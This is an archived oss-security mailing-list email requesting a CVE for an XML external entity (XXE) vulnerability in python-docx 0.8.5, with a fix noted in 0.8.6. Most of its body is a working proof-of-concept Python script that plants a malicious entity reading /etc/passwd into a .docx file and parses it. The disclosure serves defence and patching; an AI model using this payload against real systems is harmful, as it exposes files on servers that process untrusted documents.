X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2701" "Tuesday" "28" "June" "2016" "17:31:22" "-0400" "Pierre Ernst" "pernst@salesforce.com" "<CAO8=cJ9uNJNtPb-GVqq168h4ODCkaxS6W+bX2DFMtpty-MJh2g@mail.gmail.com>" "100" "[oss-security] CVE request - python-docx 0.8.5 - XXE" nil nil nil "6" "2016062821:31:22" "[oss-security] CVE request - python-docx 0.8.5 - XXE" (number mark "U       pernst@sales Jun 28  100/2701  " thread-indent "\"[oss-security] CVE request - python-docx 0.8.5 - XXE\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5913 invoked by uid 550); 28 Jun 2016 22:04:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20266 invoked from network); 28 Jun 2016 21:31:35 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=salesforce.com; s=google;
        h=mime-version:from:date:message-id:subject:to;
        bh=w9dLQml9ieudd7hRg1qrrh8kjyTaAL/IQ3h50FRNehs=;
        b=eQbP+3/rlb93k+30sXIGxfJGlE94Z2pB1oRlHryk8siAjWU6iyxEp6OJYxP4VdT+Q1
         VTM2GLVSP4uOaZJPrPUpyt3+0n8VxED/TEyBATB+OXWNMVLEu4RszQuBcWJb0/rVbIN0
         IKB1WUEGspihft1clfoOaNXl9uv/CmKyf4Zwg=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=w9dLQml9ieudd7hRg1qrrh8kjyTaAL/IQ3h50FRNehs=;
        b=SRXDtpYcQGwBNkG3UcDm8lJE0Zo/1x7NVys9ueFb8fnXMYdlWKEgDOjYRyh5yAd8rb
         XWXfHOPTsrfShZR0PPFVoTfTOl4Jxgr3hV/vg6WWdU9RF1kgQQ/GoaAUEKQ/tWa2moos
         FSWUXZQ8F2BOnYO9tcmHybwjddn5AmQb1wBbJk+uyuwZjIN6Tyci/dzAurSD9OLY1Ut2
         ZXHCmJAE3FUYtYzWj5asjevloSy1ptaBITuJd8MnLqu58VFLioKSoZMQFLHE6eEw3uCT
         CyRxM/NlOqwfPpLOPLL2UlVb/F0qQSoXPfXAkyVRnvkIrgiELOJfv3k7FyX3FnSlqP4D
         /Fgw==
X-Gm-Message-State: ALyK8tI3+dIvQ6oasBh2BTtXGcy8r8Z0ow7AjQUksuOdDQXr9M6qxGdMjehbrdi/lumlvG0ASCtA96kJL76Evv+V
X-Received: by 10.157.35.111 with SMTP id k44mr3612542otd.18.1467149482588;
 Tue, 28 Jun 2016 14:31:22 -0700 (PDT)
MIME-Version: 1.0
From: Pierre Ernst <pernst@salesforce.com>
Date: Tue, 28 Jun 2016 17:31:22 -0400
Message-ID: <CAO8=cJ9uNJNtPb-GVqq168h4ODCkaxS6W+bX2DFMtpty-MJh2g@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset=UTF-8
Subject: [oss-security] CVE request - python-docx 0.8.5 - XXE

The python-docx package
(https://github.com/python-openxml/python-docx) is vulnerable to XML
External Entity attacks (XXE).

Version 0.8.6 (https://github.com/python-openxml/python-docx/releases/tag/v0.8.6)
contains a fix.

I would like to thanks Steve Canny for the prompt response.

The following POC has been tested on version 0.8.5.

Older versions of the package might be vulnerable as well.


import docx
import zipfile
import tempfile
import os

# define malicious XML
xml_string = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<w:document xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
xmlns:w10="urn:schemas-microsoft-com:office:word"
xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing">
<w:body>
<w:p>
<w:pPr>
<w:pStyle w:val="Normal" />
<w:rPr></w:rPr>
</w:pPr>
<w:r>
<w:rPr></w:rPr>
<w:t>
Pierre Ernst, Salesforce --[&xxe;]--
</w:t>
</w:r>
</w:p>
<w:p>
<w:pPr>
<w:pStyle w:val="Normal" />
<w:rPr></w:rPr>
</w:pPr>
<w:r>
<w:rPr></w:rPr>
<w:t></w:t>
</w:r>
</w:p>
<w:sectPr>
<w:type w:val="nextPage" />
<w:pgSz w:w="12240" w:h="15840" />
<w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134"
w:footer="0" w:bottom="1134" w:gutter="0" />
<w:pgNumType w:fmt="decimal" />
<w:formProt w:val="false" />
<w:textDirection w:val="lrTb" />
</w:sectPr>
</w:body>
</w:document>'''

# source: http://stackoverflow.com/questions/25738523/how-to-update-one-file-inside-zip-file-using-python
def updateZip(zipname, filename, data):
    # generate a temp file
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
    os.close(tmpfd)

    # create a temp copy of the archive without filename
    with zipfile.ZipFile(zipname, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
            for item in zin.infolist():
                if item.filename != filename:
                    zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    os.remove(zipname)
    os.rename(tmpname, zipname)

    # now add filename with its new data
    with zipfile.ZipFile(zipname, mode='a',
compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)

# update legit docx file with malicious XML
updateZip('whatever.docx', 'word/document.xml', xml_string)

# process with python-docx
document = docx.Document('whatever.docx')
print '\n\n'.join([paragraph.text for paragraph in document.paragraphs])




-- 
Pierre Ernst
Salesforce
